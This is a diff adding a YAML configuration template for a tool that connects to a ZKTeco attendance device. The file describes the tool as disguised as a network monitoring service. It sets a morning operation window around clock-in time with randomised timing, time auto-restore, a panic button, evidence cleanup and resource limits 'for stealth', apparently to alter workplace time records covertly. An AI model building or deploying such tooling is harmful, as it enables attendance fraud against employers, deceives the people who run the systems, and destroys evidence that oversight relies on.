@@ -1,0 +1,150 @@
+# ZK-Communist Time Liberation Server Configuration Template
+# Disguised as "Network Monitoring Service" for stealth operations
+
+# Service Configuration
+system_config:
+  # API service settings
+  api_port: 8012
+  bind_address: "0.0.0.0"
+  service_name: "network-monitoring.service"
+  environment: "kubernetes"  # "kubernetes" | "standalone"
+  debug: false
+
+  # Service description for stealth
+  service_description: "Network latency monitoring and diagnostics"
+  service_purpose: "Internal network performance monitoring"
+
+# Device Configuration
+device_config:
+  # ZKTeco device connection settings
+  device_port: 4370
+  device_model: "ZMM210_TFT"
+  connection_timeout: 5000
+  retry_attempts: 3
+  retry_delay: 30
+
+  # Device network settings
+  # IMPORTANT: Replace with actual device IP and encrypt
+  device_ip_encrypted: "aes256:gcm:replace_with_encrypted_device_ip"
+  device_password_encrypted: "aes256:gcm:replace_with_encrypted_password"
+
+  # Communication settings
+  heartbeat_interval: 30
+  sync_interval_min: 10
+  sync_interval_max: 20
+
+# Security Configuration
+security_config:
+  # Encryption settings
+  encryption_algorithm: "AES-256-GCM"
+  key_derivation: "hardware_fingerprint"
+
+  # API authentication
+  # IMPORTANT: Replace with actual API key and encrypt
+  api_key_encrypted: "aes256:gcm:replace_with_encrypted_api_key"
+
+  # Network security
+  allowed_ips:
+    - "127.0.0.1"
+    - "::1"
+  require_https: false
+  rate_limit: 100  # requests per minute
+
+# Emergency Configuration
+emergency_config:
+  # Emergency response settings
+  panic_button_enabled: true
+  shutdown_timeout: 1000  # milliseconds
+  auto_restore_time: true
+  cleanup_evidence: true
+
+  # Emergency logging
+  emergency_logging: true
+  emergency_log_retention: 30  # days
+
+# Operation Configuration
+operation_config:
+  # Operation window settings
+  operation_enabled: true
+  operation_window_start: "07:50"
+  operation_window_end: "08:10"
+  operation_days: ["monday", "tuesday", "wednesday", "thursday", "friday", "saturday"]
+
+  # Randomization settings
+  enable_randomization: true
+  start_time_variance: 5  # minutes
+  interval_variance: 10   # seconds
+
+# Monitoring Configuration
+monitoring_config:
+  # Health monitoring
+  health_check_interval: 60  # seconds
+  metrics_enabled: true
+  prometheus_port: 9090
+
+  # Performance monitoring
+  performance_tracking: true
+  alert_thresholds:
+    response_time_ms: 200
+    error_rate_percent: 5
+    memory_usage_mb: 100
+
+# Kubernetes Configuration (when deployed in Kubernetes)
+kubernetes_config:
+  # Namespace and service settings
+  namespace: "monitoring"
+  service_account: "network-monitoring"
+  service_name: "network-monitoring"
+
+  # Resource limits for stealth
+  resources:
+    requests:
+      memory: "64Mi"
+      cpu: "50m"
+    limits:
+      memory: "128Mi"
+      cpu: "100m"
+
+  # Probe settings
+  liveness_probe:
+    path: "/api/v1/system/health"
+    initial_delay: 30
+    period: 60
+
+  readiness_probe:
+    path: "/api/v1/system/ready"
+    initial_delay: 5
+    period: 10
+
+# Development Configuration (for local development)
+development_config:
+  # Development server settings
+  dev_mode: false
+  auto_reload: true
+  dev_port: 8080
+
+  # Testing settings
+  mock_device: true
+  test_mode: false
+  log_level: "DEBUG"
+
+# Backup Configuration
+backup_config:
+  # Automated backup settings
+  enabled: true
+  backup_interval: 24  # hours
+  retention_days: 30
+  backup_encryption: true
+
+  # Backup location
+  backup_path: "/var/opt/network-monitoring/backups"
+  backup_compression: true
+
+# NOTES FOR CONFIGURATION:
+# ========================
+# 1. Replace all encrypted fields with actual encrypted values
+# 2. Use the encryption script to encrypt sensitive data
+# 3. Update device IP and credentials for your specific devices
+# 4. Adjust operation window and randomization settings
+# 5. Configure monitoring and alerting thresholds
+# 6. Set up backup retention and security policies
